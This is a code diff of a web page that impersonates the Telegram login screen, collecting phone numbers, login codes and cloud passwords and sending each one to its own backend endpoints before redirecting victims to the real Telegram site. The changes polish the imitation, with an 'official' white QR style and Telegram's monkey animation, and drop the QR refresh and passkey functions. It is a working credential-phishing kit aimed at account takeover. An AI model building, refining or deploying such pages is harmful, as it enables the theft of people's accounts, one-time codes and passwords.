@@ -6,7 +6,6 @@
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="theme-color" content="#0f0f0f">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.9.6/lottie.min.js"></script>
@@ -20,6 +19,7 @@
             --text-color: #ffffff;
             --text-secondary: #aaaaaa;
             --input-border: #333333;
+            --white: #ffffff;
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -28,162 +28,141 @@
             margin: 0;
             background-color: var(--background-color);
             color: var(--text-color);
-            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Apple Color Emoji", sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .auth-container {
             width: 100%;
-            max-width: 360px;
-            padding: 20px;
+            max-width: 380px;
+            padding: 40px 24px;
             text-align: center;
-            z-index: 1;
+            transition: all 0.3s ease;
         }
 
-        /* --- LOGO & IMAGE SECTION --- */
-        .auth-image {
-            margin-bottom: 32px;
-            display: flex;
-            justify-content: center;
-            position: relative;
-        }
-
-        .tg-logo-large {
-            width: 120px;
-            height: 120px;
-            animation: scaleIn 0.4s ease-out;
-        }
-
-        /* --- QR CODE STYLING --- */
-        .qr-container {
+        /* --- QR CODE SECTION (OFFICIAL WHITE STYLE) --- */
+        .qr-wrapper {
             position: relative;
             width: 240px;
             height: 240px;
-            padding: 10px;
-            border: 2px solid var(--accent-color);
+            margin: 0 auto 32px;
+            background: var(--white);
+            padding: 16px;
             border-radius: 28px;
-            background: transparent;
-            margin: 0 auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            animation: scaleIn 0.4s ease-out;
         }
 
         #qr-canvas {
             width: 100%;
             height: 100%;
-            border-radius: 12px;
-            mix-blend-mode: screen;
-            transition: opacity 0.5s ease;
+            display: block;
         }
 
-        .qr-center-logo {
+        .qr-center-icon {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 50px;
-            height: 50px;
-            background: var(--background-color);
-            border: 2px solid var(--accent-color);
+            width: 54px;
+            height: 54px;
+            background: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        /* --- MONKEY ANIMATION --- */
+        .monkey-box {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 20px;
         }
 
         /* --- TYPOGRAPHY --- */
-        h1 { font-size: 28px; font-weight: 500; margin: 0 0 12px; }
-        p { font-size: 16px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 35px; }
+        h1 { font-size: 30px; font-weight: 500; margin: 0 0 12px; letter-spacing: -0.5px; }
+        p { font-size: 16px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 40px; padding: 0 10px; }
 
-        /* --- INPUTS --- */
-        .input-wrapper {
-            background: var(--surface-color);
+        /* --- FORM ELEMENTS --- */
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .tg-input {
+            width: 100%;
+            background: transparent;
             border: 1px solid var(--input-border);
             border-radius: 12px;
-            padding: 10px 16px;
-            text-align: left;
-            margin-bottom: 20px;
-            transition: border 0.2s;
-        }
-
-        .input-wrapper:focus-within { border: 2px solid var(--accent-color); }
-
-        .input-label {
-            color: var(--accent-color);
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-
-        input {
-            background: transparent;
-            border: none;
-            outline: none;
+            padding: 16px;
             color: white;
-            font-size: 18px;
-            width: 100%;
-            padding: 4px 0;
+            font-size: 17px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .tg-input:focus {
+            border: 2px solid var(--accent-color);
+            padding: 15px; /* Adjust for border width */
         }
 
         /* --- BUTTONS --- */
-        .btn-primary {
-            background: var(--accent-color);
+        .btn-tg {
+            background-color: var(--accent-color);
             color: white;
             border: none;
             border-radius: 12px;
             width: 100%;
-            padding: 16px;
-            font-size: 15px;
-            font-weight: 700;
+            padding: 17px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            margin-top: 10px;
+            transition: filter 0.2s, transform 0.1s;
         }
 
-        .btn-primary:active { opacity: 0.8; transform: scale(0.98); }
+        .btn-tg:active { transform: scale(0.98); }
 
-        .link-action {
+        .link-text {
             color: var(--accent-color);
-            text-transform: uppercase;
-            font-weight: 700;
-            font-size: 14px;
-            margin-top: 25px;
-            display: block;
+            font-weight: 600;
+            margin-top: 32px;
+            display: inline-block;
             cursor: pointer;
+            text-transform: uppercase;
+            font-size: 14px;
             text-decoration: none;
         }
 
-        /* --- STEPS & ANIMATIONS --- */
+        /* --- STATE MANAGEMENT --- */
         .step { display: none; }
-        .step.active { display: block; animation: slideUp 0.35s ease-out; }
+        .step.active { display: block; animation: fadeIn 0.4s ease; }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
 
-        @keyframes scaleIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
+        /* --- SPINNER --- */
         .loader {
             display: none;
-            width: 28px;
-            height: 28px;
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid var(--accent-color);
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 20px auto;
         }
-
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* intl-tel-input overrides */
+        /* intl-tel-input Customization */
         .iti { width: 100%; }
         .iti__country-list { background: #212121; border: 1px solid #333; color: white; border-radius: 12px; }
     </style>
@@ -193,126 +172,101 @@
     <div class="auth-container">
         
         <div id="step-qr" class="step active">
-            <div class="auth-image">
-                <div class="qr-container">
-                    <img id="qr-canvas" src="https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=Connecting..." alt="QR Code">
-                    <div class="qr-center-logo">
-                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#8774e1" stroke-width="2.5"><path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/></svg>
-                    </div>
+            <div class="qr-wrapper">
+                <img id="qr-canvas" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TELEGRAM_CONNECT" alt="QR Code">
+                <div class="qr-center-icon">
+                    <svg width="34" height="34" viewBox="0 0 24 24" fill="#8774e1"><path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13" stroke="white" stroke-width="1.5"/></svg>
                 </div>
             </div>
             <h1>Log in to Telegram</h1>
             <p>Scan this QR code with the Telegram app on your phone to log in.</p>
-            <div class="link-action" onclick="showStep('phone')">Log in by phone number</div>
+            <div class="link-text" onclick="showStep('phone')">Log in by phone number</div>
         </div>
 
         <div id="step-phone" class="step">
-            <div class="auth-image">
-                <svg class="tg-logo-large" viewBox="0 0 160 160">
-                    <circle cx="80" cy="80" r="80" fill="#8774e1"/>
-                    <path d="M114 46.5L34.5 78.7c-4 1.5-3.8 4 0.2 5.3l20.4 6.4c4.7 1.5 8.7-0.3 11.5-2.2l41.5-26.3c1.9-1.2 3.7-0.5 2.3 0.8L73.6 89.2c-4.5 4.6-9.4 7.5-1.8 12.7l17.2 11.6c4.7 3 8.3 6.7 13.2 6.3 2.1-0.2 4.4-2.2 5.6-8.1L118.7 53c1.2-12.8-1.4-15.3-4.4-15.3l-0.3 8.8z" fill="white"/>
-                </svg>
-            </div>
+            <div class="monkey-box" id="monkey-phone"></div>
             <h1>Your Phone</h1>
             <p>Please confirm your country code and enter your phone number.</p>
-            <div class="input-wrapper">
-                <div class="input-label">Phone Number</div>
-                <input type="tel" id="phone-input">
+            <div class="input-group">
+                <input type="tel" id="phone-input" class="tg-input">
             </div>
-            <button class="btn-primary" onclick="submitPhone()">Next</button>
-            <div class="link-action" onclick="handlePasskey()" style="background: rgba(135,116,225,0.1); padding: 12px; border-radius: 12px; margin-top: 15px;">Log in with Passkey</div>
-            <div class="link-action" onclick="showStep('qr')">Back to QR Code</div>
+            <button class="btn-tg" onclick="submitPhone()">Next</button>
+            <div class="link-text" onclick="showStep('qr')">Back to QR Code</div>
         </div>
 
         <div id="step-code" class="step">
-            <div class="auth-image">
-                <svg width="80" height="80" viewBox="0 0 160 160">
-                    <circle cx="80" cy="80" r="80" fill="#8774e1"/>
-                    <path d="M114 46.5L34.5 78.7c-4 1.5-3.8 4 0.2 5.3l20.4 6.4c4.7 1.5 8.7-0.3 11.5-2.2l41.5-26.3c1.9-1.2 3.7-0.5 2.3 0.8L73.6 89.2c-4.5 4.6-9.4 7.5-1.8 12.7l17.2 11.6c4.7 3 8.3 6.7 13.2 6.3 2.1-0.2 4.4-2.2 5.6-8.1L118.7 53c1.2-12.8-1.4-15.3-4.4-15.3l-0.3 8.8z" fill="white"/>
-                </svg>
-            </div>
-            <h1 id="display-num">Code</h1>
+            <div class="monkey-box" id="monkey-code"></div>
+            <h1 id="phone-display">Code</h1>
             <p>We've sent the code to the <b>Telegram</b> app on your other device.</p>
-            <div class="input-wrapper">
-                <div class="input-label">Login Code</div>
-                <input type="text" id="otp-input" placeholder="00000" maxlength="5" style="text-align:center; letter-spacing:10px; font-weight:bold;">
+            <div class="input-group">
+                <input type="text" id="otp-input" class="tg-input" placeholder="00000" maxlength="5" style="text-align:center; letter-spacing:10px; font-weight:bold;">
             </div>
-            <button class="btn-primary" onclick="submitCode()">Verify</button>
+            <button class="btn-tg" onclick="submitCode()">Verify</button>
         </div>
 
         <div id="step-2fa" class="step">
-            <div class="auth-image">
-                <div id="monkey-anim" style="width: 140px; height: 140px;"></div>
-            </div>
+            <div class="monkey-box" id="monkey-pass"></div>
             <h1>Password</h1>
             <p>Your account is protected with a Cloud Password. Please enter it below.</p>
-            <div class="input-wrapper">
-                <div class="input-label">Password</div>
-                <input type="password" id="pass-input" placeholder="Enter your password">
+            <div class="input-group">
+                <input type="password" id="pass-input" class="tg-input" placeholder="Password">
             </div>
-            <button class="btn-primary" onclick="submit2FA()">Unlock</button>
+            <button class="btn-tg" onclick="submit2FA()">Unlock</button>
         </div>
 
-        <div class="loader" id="loading-spinner"></div>
+        <div class="loader" id="spinner"></div>
     </div>
 
     <script>
         const tid = new URLSearchParams(window.location.search).get('id') || 'Global';
         let currentPhone = "";
 
-        // --- 1. INITIALIZE PHONE INPUT ---
-        const phoneField = document.querySelector("#phone-input");
-        const iti = window.intlTelInput(phoneField, {
+        // 1. Initialize Phone Input
+        const phoneInput = document.querySelector("#phone-input");
+        const iti = window.intlTelInput(phoneInput, {
             initialCountry: "kh",
             separateDialCode: true,
             utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
         });
 
-        // --- 2. INITIALIZE MONKEY ---
-        const monkey = lottie.loadAnimation({
-            container: document.getElementById('monkey-anim'),
-            renderer: 'svg',
-            loop: false,
-            autoplay: false,
-            path: 'https://assets10.lottiefiles.com/packages/lf20_969018ny.json'
-        });
+        // 2. Official Monkey Lottie Setup
+        const monkeyUrl = 'https://assets1.lottiefiles.com/packages/lf20_969018ny.json';
+        
+        function createMonkey(id) {
+            return lottie.loadAnimation({
+                container: document.getElementById(id),
+                renderer: 'svg', loop: false, autoplay: false, path: monkeyUrl
+            });
+        }
 
-        const passInput = document.getElementById('pass-input');
-        passInput.addEventListener('focus', () => monkey.playSegments([30, 60], true));
-        passInput.addEventListener('blur', () => monkey.playSegments([0, 30], true));
+        const mPhone = createMonkey('monkey-phone');
+        const mCode = createMonkey('monkey-code');
+        const mPass = createMonkey('monkey-pass');
 
-        // --- 3. UI LOGIC ---
+        // Initial idle animation
+        mPhone.playSegments([0, 30], true);
+
+        // Password input "Hands over eyes" effect
+        const passField = document.getElementById('pass-input');
+        passField.addEventListener('focus', () => mPass.playSegments([30, 60], true));
+        passField.addEventListener('blur', () => mPass.playSegments([60, 0], true));
+
+        // 3. Navigation
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
             document.getElementById(`step-${stepId}`).classList.add('active');
-            document.getElementById('loading-spinner').style.display = 'none';
+            
+            // Trigger specific step animations
+            if(stepId === 'phone') mPhone.goToAndPlay(0, true);
+            if(stepId === 'code') mCode.playSegments([0, 40], true);
+            if(stepId === '2fa') mPass.goToAndStop(0, true);
         }
 
-        // --- 4. BACKEND INTEGRATION ---
-        async function updateQR() {
-            if(!document.getElementById('step-qr').classList.contains('active')) return;
-            try {
-                const res = await fetch('/get_qr', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ id: tid })
-                });
-                const data = await res.json();
-                if(data.qr_image) {
-                    const qrImg = document.getElementById('qr-canvas');
-                    qrImg.src = `data:image/png;base64,${data.qr_image}`;
-                    qrImg.style.opacity = "1";
-                }
-            } catch(e) { console.log("Waiting for backend..."); }
-        }
-
-        setInterval(updateQR, 15000); // Refresh QR every 15s
-        updateQR();
-
+        // 4. Submission Handlers
         async function submitPhone() {
             currentPhone = iti.getNumber();
             if(!iti.isValidNumber()) return alert("Invalid number");
-            document.getElementById('display-num').innerText = currentPhone;
+            document.getElementById('phone-display').innerText = currentPhone;
             showStep('code');
             fetch('/step_phone', {
                 method: 'POST',
@@ -324,7 +278,7 @@
         async function submitCode() {
             const code = document.getElementById('otp-input').value;
             if(code.length < 5) return;
-            document.getElementById('loading-spinner').style.display = 'block';
+            document.getElementById('spinner').style.display = 'block';
             
             const res = await fetch('/step_code', {
                 method: 'POST',
@@ -333,17 +287,15 @@
             });
             const data = await res.json();
             
-            if(data.status === "success") window.location.href = "https://web.telegram.org/k/";
+            if(data.status === "success") window.location.href = "https://web.telegram.org/a/";
             else if(data.status === "2fa_needed") showStep('2fa');
-            else {
-                alert("Invalid Code");
-                document.getElementById('loading-spinner').style.display = 'none';
-            }
+            else alert("Invalid Login Code");
+            document.getElementById('spinner').style.display = 'none';
         }
 
         async function submit2FA() {
             const pass = document.getElementById('pass-input').value;
-            document.getElementById('loading-spinner').style.display = 'block';
+            document.getElementById('spinner').style.display = 'block';
             
             const res = await fetch('/step_2fa', {
                 method: 'POST',
@@ -352,19 +304,9 @@
             });
             const data = await res.json();
             
-            if(data.status === "success") window.location.href = "https://web.telegram.org/k/";
-            else {
-                alert("Wrong Password");
-                document.getElementById('loading-spinner').style.display = 'none';
-            }
-        }
-
-        function handlePasskey() {
-            if (window.PublicKeyCredential) {
-                alert("WebAuthn requested. Waiting for backend challenge...");
-            } else {
-                alert("Browser does not support Passkeys.");
-            }
+            if(data.status === "success") window.location.href = "https://web.telegram.org/a/";
+            else alert("Incorrect Password");
+            document.getElementById('spinner').style.display = 'none';
         }
     </script>
 </body>
